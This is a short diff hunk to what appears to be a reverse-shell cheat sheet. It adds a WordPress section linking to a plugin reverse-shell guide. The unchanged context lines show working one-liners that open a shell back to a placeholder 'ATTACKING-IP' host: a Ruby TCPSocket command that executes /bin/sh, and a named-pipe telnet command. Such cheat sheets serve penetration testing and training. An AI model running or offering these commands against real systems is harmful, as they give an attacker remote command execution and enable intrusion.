@@ -93,7 +93,8 @@ ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh 
 
 rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
 ````
-
+### Wordpress
+https://www.sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell
 
 ## WINDOWS
 #### COMON
